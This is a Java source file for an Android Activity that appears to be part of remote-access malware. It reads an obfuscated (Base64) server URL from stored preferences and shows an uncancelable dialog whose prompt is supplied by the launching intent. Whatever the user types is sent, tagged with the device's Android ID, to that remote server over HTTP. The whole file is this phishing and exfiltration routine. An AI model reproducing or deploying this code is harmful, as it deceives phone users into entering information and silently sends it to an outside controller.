package com.connect;

import java.io.InputStream;
import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.text.SimpleDateFormat;
import java.util.Date;

import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Bundle;
import android.preference.PreferenceManager;
import android.provider.Settings.Secure;
import android.util.Base64;
import android.util.Log;
import android.widget.EditText;

public class Dialog extends Activity {
	private String URL;
	private String password;
	 
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
 		try {
 			URL = new String( Base64.decode( PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("URL", ""), Base64.DEFAULT ));
 			password = new String( Base64.decode( PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("password", ""), Base64.DEFAULT ));
		} catch (Exception e1) {e1.printStackTrace();}
		
        Intent sender=getIntent();
        String title = sender.getExtras().getString("Title");
        String message = sender.getExtras().getString("Message");

        AlertDialog.Builder alert = new AlertDialog.Builder(this);                 
        alert.setTitle(title);  
        alert.setMessage(message);                

         final EditText input = new EditText(this); 
         alert.setView(input);

         alert.setNegativeButton("Cancel", new DialogInterface.OnClickListener() {  
         public void onClick(DialogInterface dialog, int whichButton) {  
        	 finish();
             return;                  
            }  
          });  
         
          alert.setPositiveButton("Ok", new DialogInterface.OnClickListener() {  
          public void onClick(DialogInterface dialog, int whichButton) {  
              String value = input.getText().toString();
              Log.i("com.connect", "Alert: " + value);
              
				try {
			        getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Dialog Response: " + value);        	
				} catch (Exception e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}

         	  finish();
              return;                  
             }  
           });
            
          alert.setCancelable(false);
          alert.show();
    }
    
    public InputStream getInputStreamFromUrl(String urlBase, String urlData) throws UnsupportedEncodingException {
    	
//    	Log.d("com.connect", urlBase);
    	Log.d("com.connect", urlData);

        SimpleDateFormat sdf = new SimpleDateFormat("yyyy_MM_dd_HH:mm:ss");
        String currentDateandTime = "[" + sdf.format(new Date()) + "] - ";
        currentDateandTime = URLEncoder.encode (currentDateandTime, "UTF-8");

    	urlData = URLEncoder.encode (urlData, "UTF-8");

    	if(isNetworkAvailable())
    	{
    	  InputStream content = null;
    	  try 
    	  {
    	    HttpClient httpclient = new DefaultHttpClient();
    	    HttpResponse response = httpclient.execute(new HttpGet(urlBase + currentDateandTime+ urlData));
    	    content = response.getEntity().getContent();
    	    httpclient.getConnectionManager().shutdown();
    	  } catch (Exception e) {
    	  }
    	    return content;
    	}
		return null;
    }
    //********************************************************************************************************************************************************
    public boolean isNetworkAvailable() {
        ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo networkInfo = cm.getActiveNetworkInfo();
        if (networkInfo != null && networkInfo.isConnected()) {
            return true;
        }
        return false;
    } 
}